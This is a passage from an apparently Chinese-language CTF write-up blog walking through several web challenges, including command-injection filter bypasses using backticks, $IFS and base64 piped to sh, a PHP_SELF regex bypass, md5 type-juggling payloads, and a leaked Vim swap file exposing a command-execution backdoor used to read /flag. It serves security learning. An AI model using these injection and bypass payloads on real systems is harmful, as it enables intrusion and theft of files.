最后的1可以是其他数字,效果是一样的</p><p>bjut.edu.cn;cat$IFS$1flag.php</p><p>回显fxck your flag! flag也被过滤了<br>那就查看一下index.php文件,发现里面是源代码</p><pre><code class="hljs">if(isset($_GET[&#39;ip&#39;]))&#123;        $ip = $_GET[&#39;ip&#39;];        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;            print_r($match);            print($ip);            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);            die(&quot;fxck your symbol!&quot;);        &#125;        else if(preg_match(&quot;/ /&quot;, $ip))&#123;            die(&quot;fxck your space!&quot;);        &#125;        else if(preg_match(&quot;/bash/&quot;, $ip))&#123;            die(&quot;fxck your bash!&quot;);        &#125;        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;            #检查字符串中是否分别含有 &#39;f&#39;, &#39;l&#39;, &#39;a&#39;, &#39;g&#39; 这四个字母,无论这四个字母之间有多少或什么其他的字符,而且它们出现的顺序与 &quot;flag&quot; 字符串中的顺序相同            die(&quot;fxck your flag!&quot;);        &#125;        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);        echo &quot;&quot;;        print_r($a);    &#125;</code></pre><h5 id="方法一-反引号绕过"><a href="#方法一-反引号绕过" class="headerlink" title="方法一: 反引号绕过"></a>方法一: 反引号绕过</h5><p>其中过滤了很多符号,但是没有过滤反引号&#96;&#96;</p><p>使用反引号绕过  127.0.0.1;cat$IFS$1<code>ls</code> (先执行&#96;&#96;里面的代码,绕过输入flag的限制)</p><p>然后f12查看源码得到被注释的flag</p><h5 id="方法二-变量绕过"><a href="#方法二-变量绕过" class="headerlink" title="方法二:变量绕过"></a>方法二:变量绕过</h5><p>例如a&#x3D;l;b&#x3D;s;$a$b  就会执行ls<br>输入框输入   127.0.0.1;x&#x3D;f;cat$IFS$1$xlag.php<br>这种情况会显示fuck flag,即被过滤,因为整个字符串参数ip中 f l a g 顺序出现</p><pre><code class="hljs">127.0.0.1;x=l;cat$IFS$1f$xag.php    没被过滤,但是不回显flag127.0.0.1;x=a;cat$IFS$1fl$xg.php    也是一样不回显flag127.0.0.1;x=g;cat$IFS$1fla$x.php    查看源码得到flag127.0.0.1;x=ag;cat$IFS$1fl$x.php    查看源码也可以得到flag127.0.0.1;x=lag;cat$IFS$1f$x.php    查看源码也可以得到flag</code></pre><p>这里我的理解是f$xag.php  和 fl$xg.php 不回显flag 是因为把原本的参数$x 当成了$xag 和  $xg<br>所以要把参数放在最后才会识别为$x</p><h5 id="方法三-base64编码绕过"><a href="#方法三-base64编码绕过" class="headerlink" title="方法三:base64编码绕过"></a>方法三:base64编码绕过</h5><p>这里还可以将cat flag.php进行base64编码<br>得到Y2F0IGZsYWcucGhw       再用base64-d命令来执行<br>虽然过滤了bash但大部分命令仍然可以用sh来代替执行</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS-d|sh<br></code></pre></td></tr></table></figure><p>使用 echo命令使得cat flag.php的base64编码被正确地作为输入参数传递给 base64 -d</p><p>即前面的  echo$IFS$1Y2F0IGZsYWcucGhw  作为管道符的输入</p><p>同样可以使用反引号&#96;&#96;配合base64编码绕过,这样不需要使用sh</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$<span class="hljs-number">1</span>-d`<br></code></pre></td></tr></table></figure><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>前置知识：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]<br>它代表当前正在执行的脚本的文件名。例如，如果当前正在执行的脚本是 example.php，那么 <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] 的值就会是 /path/to/example.php（具体的路径取决于服务器配置和脚本的位置）。<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]<br>它代表当前请求的 URI（Uniform Resource Identifier，统一资源标识符），也就是访问当前页面的完整路径及查询参数部分。<br>例如，如果用户访问 `http:<span class="hljs-comment">//example.com/page.php?id=123`，那么 `$_SERVER[&#x27;REQUEST_URI&#x27;]` 的值可能是 `/page.php?id=123`。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">highlight_file是一个 PHP 函数，它的作用是将指定文件的内容以语法高亮的形式输出显示。<br><span class="hljs-built_in">basename</span>函数从中提取出文件名部分<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]代表当前脚本的路径及文件名<br></code></pre></td></tr></table></figure><p>所以接下来我们有两件事情要做，一件事绕过正则是使show_source不为空，另一件事是使basename($_SERVER[‘PHP_SELF’])值为utils.php，即使$_SERVER[‘PHP_SELF’]为******&#x2F;utils.php，最后basename这个值就会为utils.php再然后就highlight_file读取到文件。</p><p>所以我们要想办法绕&#x2F;utils.php/*$&#x2F;i 以及&#x2F;show_source&#x2F;这个正则匹配，</p><ul><li>接着一个个过滤，先考虑第二个if语句，我们在<code>utils.php</code>后面加一个非ascii字符即可（因为是从后往前找，遇到非ascii字符就停了）：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/utils.php/哈哈?show_source=1<br></code></pre></td></tr></table></figure><ul><li>再看第三个if语句，记住以下特性即可：</li></ul><blockquote><p>GET或POST方式传进去的变量名,会自动将<code>空格 + . [</code>转换为<code>_</code></p><p>所以这里我们传入<code>show[source</code>先通过第三个if，在第四个if中GET传参的时候会转换回<code>_</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/utils.php/哈?show[<span class="hljs-built_in">source</span>=1<br></code></pre></td></tr></table></figure><p>但是传入上述payload没回显，看其他师傅的wp说前面得加上<code>index.php</code>，我也不知道为啥，总之最后payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php/utils.php/哈哈?show[<span class="hljs-built_in">source</span>=1<br></code></pre></td></tr></table></figure><p>解答：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">为什么前面需要添加一个/<span class="hljs-keyword">index</span>.php呢<br><br></code></pre></td></tr></table></figure><h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b2&#x27;</span>])&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b1&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b2&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c1&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c1&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c2&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yee&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nop&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;go on&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;let&#x27;s get some php&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>先过第一个if，需要a不含数字而且intval取整数</li><li>官方对intval的解释是</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="hljs-keyword">int</span> 数值。 <span class="hljs-title function_ invoke__">intval</span>() 不能用于 <span class="hljs-keyword">object</span>，否则会产生 E_WARNING 错误并返回 <span class="hljs-number">1</span>。 <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// </span><br></code></pre></td></tr></table></figure><p>所以我们传入数组就能过掉第一个if</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>第三个if，由于md5函数无法处理数组,会返回nul</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b1</span>[]=<span class="hljs-number">1</span>&amp;b2[]=<span class="hljs-number">12</span> <br><span class="hljs-attribute">md5</span>(b1[]=<span class="hljs-number">1</span>) === md5(b2[]=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li>第四个if，需要传入值是字符串且md5值相等</li></ul><blockquote><p>弱判断下，0e开头的数等于0，所以使两端的md5值都为0e开头即可</p></blockquote><p>以下这些字符串，md5哈希之后都是0e开头的：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">QLTHNDT<br><span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br><br>QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c1</span>=QLTHNDT&amp;c2=QNKCDZO<br></code></pre></td></tr></table></figure><p>所以最终的payload是</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">a[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;b1</span>[]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;b2</span>[]=<span class="hljs-number">12</span><span class="hljs-variable">&amp;c1</span>=QLTHNDT<span class="hljs-variable">&amp;c2</span>=QNKCDZO<br></code></pre></td></tr></table></figure><h1 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h1><p><img src="/2024/10/25/susu/3.png" alt="图片"></p><p>vim泄露在url加上&#x2F;.vim  ..&#x2F;..&#x2F;..&#x2F;.vim发现也不行，用dirsearch -u扫描一下发现&#x2F;.index.php.swp</p><p><img src="/2024/10/25/susu/4.png" alt="图片"></p><p>下载了一个文件用记事打开分析</p><p><img src="/2024/10/25/susu/5.png" alt="图片"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> &lt;/body&gt;     &lt;/main&gt;         &lt;/div&gt;             <span class="hljs-meta">?&gt;</span>             &#125;                 <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));                 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;             <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$password</span>)) &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;             <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;Give_Me_Your_Flag&quot;</span>;             <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);             <span class="hljs-meta">&lt;?php</span>         &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">can_can_vim</span>&quot;&gt;         &lt;/<span class="hljs-title">h3</span>&gt;             闃熼噷甯堝倕璇碫<span class="hljs-title">im</span>鏄笘鐣屼笂鏈€濂界殑缂栬緫鍣紝涓嶆帴鍙楀弽椹?         &lt;<span class="hljs-title">h3</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">vim_said</span>&quot;&gt;         &lt;/<span class="hljs-title">div</span>&gt;             &lt;/<span class="hljs-title">h1</span>&gt;                 <span class="hljs-title">Vim</span> <span class="hljs-title">yyds</span>             &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">vim_yyds</span>&quot;&gt;             &lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">https</span>://<span class="hljs-title">www</span>.<span class="hljs-title">bing</span>.<span class="hljs-title">com</span>/<span class="hljs-title">th</span>?<span class="hljs-title">id</span>=<span class="hljs-title">OSAAS</span>.7<span class="hljs-title">B95FA2D97CE022F5E7949F60E350A25</span>&amp;<span class="hljs-title">pid</span>=<span class="hljs-title">TechQna</span>&quot;&gt;&lt;/<span class="hljs-title">img</span>&gt;         &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">vim</span>&quot;&gt;     &lt;<span class="hljs-title">main</span>&gt; &lt;<span class="hljs-title">body</span>&gt;  &lt;/<span class="hljs-title">head</span>&gt;     &lt;/<span class="hljs-title">style</span>&gt;         &#125;             <span class="hljs-title">font</span>-<span class="hljs-title">size</span>: 20;         <span class="hljs-title">p</span> </span>&#123;         br,          &#125;             align-items: center;             justify-content: center;             display: flex;             color: <span class="hljs-comment">#39c2ff;         h3.vim_said &#123;          &#125;             margin-left: 5px;             margin-top: 50;             justify-content: center;             align-items: flex-start;             display: flex;             color: #50f728;         h1.vim_yyds &#123;          &#125;             height: auto;             width: 8rem;             border: none;         img &#123;          &#125;             justify-content: center;             vertical-align: middle;             align-content: center;             display: flex;         div.vim &#123;          &#125;             justify-content: center;             align-items: center;             display: flex;         html &#123;         body,     &lt;style type=&quot;text/css&quot;&gt;     &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;head&gt;  &lt;html&gt; </span><br></code></pre></td></tr></table></figure><p>发现关键点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;Give_Me_Your_Flag&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$password</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<br>            &#125;<br>            <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>password提交Give_Me_Your_Flag 的base64编码：R2l2ZV9NZV9Zb3VyX0ZsYWc&#x3D; </p><p>POST传入： password&#x3D;R2l2ZV9NZV9Zb3VyX0ZsYWc&#x3D;&amp;cmd&#x3D;cat &#x2F;flag </p><p>或者vim -r index.php.swp恢复文件，发现php源码</p><h1 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cxk&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cxk</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cxk&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$cxk</span>)==<span class="hljs-string">&quot;ctrl&quot;</span>)&#123;<br>    这行代码尝试读取变量<span class="hljs-variable">$cxk</span>（一个文件路径或URL）的内容，并将其与字符串<span class="hljs-string">&quot;ctrl&quot;</span>进行比较。如果内容相等，则执行接下来的<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;语句。这里存在一个安全隐患，因为允许用户通过GET参数直接指定文件路径可能会导致文件包含漏洞（File Inclusion Vulnerability）。<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;娲楁礂鐫″惂&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nononoononoonono&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接目录扫描</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">D:\security\dirsearch-<span class="hljs-number">0.4</span>.<span class="hljs-number">3</span>&gt;py dirsearch.py -u http:<span class="hljs-comment">//node5.anna.nssctf.cn:24087/</span><br>D:\security\dirsearch-<span class="hljs-number">0.4</span>.<span class="hljs-number">3</span>\dirsearch.py:<span class="hljs-number">23</span>: DeprecationWarning: pkg_resources <span class="hljs-keyword">is</span> <span class="hljs-keyword">deprecated</span> <span class="hljs-keyword">as</span> an API. See https:<span class="hljs-comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span><br>  <span class="hljs-keyword">from</span> pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span><br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP <span class="hljs-keyword">method</span>: GET | Threads: <span class="hljs-number">25</span> | Wordlist size: <span class="hljs-number">11460</span><br><br>Output File: D:\security\dirsearch-<span class="hljs-number">0.4</span>.<span class="hljs-number">3</span>\reports\http_node5.anna.nssctf.cn_24087\__24-<span class="hljs-number">10</span>-<span class="hljs-number">31</span>_23-<span class="hljs-number">58</span>-<span class="hljs-number">27</span>.txt<br><br>Target: http:<span class="hljs-comment">//node5.anna.nssctf.cn:24087/</span><br><br>[<span class="hljs-number">23</span>:<span class="hljs-number">58</span>:<span class="hljs-number">27</span>] Starting:<br>[<span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">04</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">233</span>B  - /test.txt<br>[<span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">08</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">192</span>B  - /www.rar<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>访问 url&#x2F;test.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cxk&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cxk</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cxk&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$cxk</span>)==<span class="hljs-string">&quot;ctrl&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;娲楁礂鐫″惂&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nononoononoonono&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问 url&#x2F;<a href="http://www.rar/">www.rar</a> 会下载压缩包, 打开内容</p><figure class="highlight 